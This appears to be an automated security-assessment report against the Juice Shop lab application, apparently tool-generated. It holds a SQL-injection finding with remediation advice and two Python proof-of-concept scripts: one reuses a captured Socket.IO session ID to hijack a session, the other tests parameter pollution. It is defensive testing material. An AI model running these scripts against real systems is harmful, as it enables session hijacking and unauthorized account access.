executive_summary.narrative:
53 hypotheses tested, 10 proven and reported. Unproven candidates are in the raw artifacts, not shown as findings.

The assessment revealed several critical vulnerabilities that expose core application functionality to exploitation. The SQL injection in the login endpoint represents the highest immediate risk, enabling full account compromise. Priority should be given to remediating authentication-related flaws, followed by access control weaknesses that could lead to privilege escalation. These findings were confirmed through automated testing with strong evidence of exploitation, indicating significant gaps in input validation and session management controls.

findings.title: SQL Injection in User Login
findings.status: confirmed exploitable (5 proof(s); merged from 5 hypotheses)
findings.recommendation: Allows unauthorized access to user accounts, potentially leading to full system compromise. Implement parameterized queries or prepared statements for all database interactions. Sanitize and validate all input fields before processing. Review and restrict database user permissions to follow the principle of least privilege.

scripts.source:
import requests
import json

# Step 1: Establish a legitimate session by initiating a Socket.IO connection
init_url = "http://juice-shop:3000/socket.io/?EIO=4&transport=polling"
init_response = requests.get(init_url)

# Extract the session ID (sid) from the response
# The body typically looks like: 97:0{"sid":"<session_id>","upgrades":["websocket"],"pingInterval":25000,"pingTimeout":20000}
response_text = init_response.text
start = response_text.find('"sid":"') + len('"sid":"')
end = response_text.find('"', start)
legitimate_sid = response_text[start:end]

print(f"Legitimate SID: {legitimate_sid}")

# Step 2: Attempt to hijack the session using the captured SID
hijack_url = f"http://juice-shop:3000/socket.io/?EIO=4&transport=polling&t=hijack_test&sid={legitimate_sid}"
hijack_headers = {"Content-Type": "text/plain;charset=UTF-8"}
hijack_data = "40"

hijack_response = requests.post(hijack_url, headers=hijack_headers, data=hijack_data)

# Output results
print(f"Hijack Response Status: {hijack_response.status_code}")
print(f"Hijack Response Body: {hijack_response.text}")

if hijack_response.status_code == 200 and hijack_response.text == "ok":
    print("SUCCESS: WebSocket session hijacked using captured SID")
else:
    print("FAILURE: Session hijacking failed even with valid SID")
scripts.description: DONE: WebSocket session hijacking vulnerability confirmed by successfully reusing a captured session ID to establish a new connection
scripts.remediation_pointer: Implement server-side validation to ensure session IDs are bound to specific client contexts and not reusable across different connections.

import requests

# Target URL with parameter pollution
url = "http://juice-shop:3000/socket.io/"
params = {
    "EIO": "4",
    "EIO": "3",  # Duplicate EIO parameter
    "transport": "polling",
    "transport": "websocket",  # Duplicate transport parameter
    "t": "Q3oFi9x",
    "t": "XYZ789",  # Duplicate t parameter
    "sid": "htTmbKmaVo8e6SXRAAAK",
    "sid": "anotherSid"  # Duplicate sid parameter
}

# Use only the last values for each parameter (how requests handles duplicates)
# So we need to construct the URL manually to preserve all parameters
polluted_url = "http://juice-shop:3000/socket.io/?EIO=4&EIO=3&transport=polling&transport=websocket&t=Q3oFi9x&t=XYZ789&sid=htTmbKmaVo8e6SXRAAAK&sid=anotherSid"

headers = {"Content-Type": "text/plain;charset=UTF-8"}
body = "40"

try:
    response = requests.post(polluted_url, headers=headers, data=body)
    print(f"Status Code: {response.status_code}")
    print(f"Response Body: {response.text}")
    print(f"Response Headers: {dict(response.headers)}")
    
    # Check if we get the expected "Transport unknown" error
    if "Transport unknown" in response.text:
        print("SUCCESS: Parameter pollution vulnerability confirmed - 'Transport unknown' error received")
    else:
        print("UNEXPECTED: Different response received")
except Exception as e:
    print(f"Error making request: {e}")
scripts.description: DONE: Parameter pollution vulnerability confirmed - sending duplicate query parameters (EIO, transport, t, sid) to /socket.io/ endpoint results in "Transport unknown" error (status 400)
scripts.remediation_pointer: Implement strict parameter validation and parsing to accept only the first occurrence of each parameter, or reject requests with duplicate parameters
